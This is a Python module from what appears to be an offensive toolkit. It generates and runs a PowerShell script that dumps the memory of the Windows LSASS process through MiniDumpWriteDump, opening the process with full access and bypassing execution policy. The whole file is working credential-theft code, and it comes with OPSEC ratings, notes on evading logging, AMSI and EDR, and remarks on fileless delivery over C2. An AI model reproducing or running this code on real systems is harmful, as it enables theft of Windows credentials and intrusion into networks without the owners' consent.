#!/usr/bin/env python3
"""
LSASS dumping via PowerShell MiniDumpWriteDump
Pure PowerShell implementation using Windows APIs
"""

import subprocess
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict

from ..utils import get_lsass_pid


class PowerShellDumper:
    """
    Dump LSASS using PowerShell and MiniDumpWriteDump API
    
    OPSEC Level: MEDIUM
    - PowerShell logging may capture activity
    - Script block logging can expose full script
    - But no external binaries required
    """
    
    METHOD_NAME = "powershell"
    OPSEC_RATING = "Medium"
    
    def __init__(self, output_dir: Path):
        self.output_dir = Path(output_dir)
    
    def _generate_dump_script(self, dump_file: Path) -> str:
        """
        Generate PowerShell script for LSASS dumping
        
        Args:
            dump_file: Path where dump will be saved
            
        Returns:
            str: PowerShell script
        """
        script = f'''
$ProcessName = "lsass"
$DumpFilePath = "{dump_file}"

Write-Host "[*] Targeting process: $ProcessName"
Write-Host "[*] Output file: $DumpFilePath"

try {{
    # Get LSASS process
    $Process = Get-Process -Name $ProcessName -ErrorAction Stop
    Write-Host "[+] LSASS PID: $($Process.Id)"
    
    # Load required assembly and define P/Invoke signatures
    Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class MiniDump {{
    [DllImport("dbghelp.dll", SetLastError = true)]
    public static extern bool MiniDumpWriteDump(
        IntPtr hProcess,
        uint ProcessId,
        IntPtr hFile,
        int DumpType,
        IntPtr ExceptionParam,
        IntPtr UserStreamParam,
        IntPtr CallbackParam
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
        uint processAccess,
        bool bInheritHandle,
        int processId
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}}
"@ -ErrorAction Stop

    Write-Host "[*] P/Invoke signatures loaded"
    
    # Open LSASS process with PROCESS_ALL_ACCESS (0x1F0FFF)
    $ProcessHandle = [MiniDump]::OpenProcess(0x1F0FFF, $false, $Process.Id)
    
    if ($ProcessHandle -eq [IntPtr]::Zero) {{
        Write-Host "[-] Failed to open LSASS process"
        Write-Host "[-] Ensure you have SeDebugPrivilege"
        exit 1
    }}
    
    Write-Host "[+] Process handle obtained"
    
    # Create dump file
    $FileStream = [System.IO.File]::Create($DumpFilePath)
    $FileHandle = $FileStream.SafeFileHandle.DangerousGetHandle()
    
    Write-Host "[*] Creating minidump..."
    
    # Dump LSASS memory
    # DumpType = 2 (MiniDumpWithFullMemory)
    $DumpType = 2
    
    $Success = [MiniDump]::MiniDumpWriteDump(
        $ProcessHandle,
        $Process.Id,
        $FileHandle,
        $DumpType,
        [IntPtr]::Zero,
        [IntPtr]::Zero,
        [IntPtr]::Zero
    )
    
    # Cleanup
    $FileStream.Close()
    [MiniDump]::CloseHandle($ProcessHandle)
    
    if ($Success) {{
        $FileInfo = Get-Item $DumpFilePath
        Write-Host "[+] LSASS dumped successfully"
        Write-Host "[+] File: $DumpFilePath"
        Write-Host "[+] Size: $({{$FileInfo.Length / 1MB}}).ToString('0.00')) MB"
        exit 0
    }} else {{
        Write-Host "[-] MiniDumpWriteDump failed"
        Write-Host "[-] Check privileges and AV/EDR"
        exit 1
    }}
    
}} catch {{
    Write-Host "[-] Error: $_"
    Write-Host "[-] $($_.Exception.Message)"
    exit 1
}}
'''
        return script
    
    def dump(self) -> Optional[Dict]:
        """
        Execute LSASS dump via PowerShell
        
        Returns:
            Dict with dump metadata or None on failure
        """
        print(f"\n[*] Method: PowerShell MiniDumpWriteDump")
        print(f"[*] OPSEC: {self.OPSEC_RATING} - PowerShell logging may capture")
        
        # Create output file path
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        dump_file = self.output_dir / f"lsass_ps_{timestamp}.dmp"
        
        # Generate PowerShell script
        ps_script = self._generate_dump_script(dump_file)
        
        print(f"[*] Executing PowerShell dump...")
        print(f"[*] Target dump file: {dump_file}")
        
        try:
            # Save script to temporary file
            script_file = self.output_dir / "dump_script_temp.ps1"
            
            with open(script_file, 'w') as f:
                f.write(ps_script)
            
            print(f"[*] Script saved to: {script_file}")
            
            # Execute PowerShell script
            result = subprocess.run(
                [
                    'powershell',
                    '-ExecutionPolicy', 'Bypass',
                    '-NoProfile',
                    '-File', str(script_file)
                ],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            # Display PowerShell output
            if result.stdout:
                print(result.stdout)
            
            if result.stderr:
                print(f"[!] stderr: {result.stderr}")
            
            # Clean up script file
            try:
                script_file.unlink()
            except:
                pass
            
            # Verify dump was created
            if dump_file.exists():
                size = dump_file.stat().st_size
                
                print(f"[+] LSASS dumped successfully!")
                print(f"[+] Dump file: {dump_file}")
                print(f"[+] Size: {size / 1024 / 1024:.2f} MB")
                
                return {
                    'method': self.METHOD_NAME,
                    'file': str(dump_file),
                    'size': size,
                    'timestamp': timestamp,
                    'opsec_rating': self.OPSEC_RATING
                }
            else:
                print(f"[-] Dump file not created")
                print(f"[-] Return code: {result.returncode}")
                return None
        
        except subprocess.TimeoutExpired:
            print(f"[-] Dump operation timed out")
            return None
        
        except Exception as e:
            print(f"[-] Dump failed: {e}")
            return None
    
    def is_available(self) -> bool:
        """Check if this method is available"""
        # PowerShell is almost always available on Windows
        return True
    
    @staticmethod
    def get_info() -> Dict:
        """Get information about this dump method"""
        return {
            'name': 'powershell',
            'description': 'PowerShell-based MiniDumpWriteDump implementation',
            'opsec_rating': 'Medium',
            'requirements': [
                'Administrative privileges',
                'PowerShell (built-in on Windows)'
            ],
            'advantages': [
                'No external binaries required',
                'Uses Windows APIs directly',
                'Fileless execution possible',
                'Can be delivered via C2'
            ],
            'disadvantages': [
                'PowerShell logging captures activity',
                'Script block logging exposes code',
                'AMSI may scan and block',
                'PowerShell execution monitored'
            ]
        }
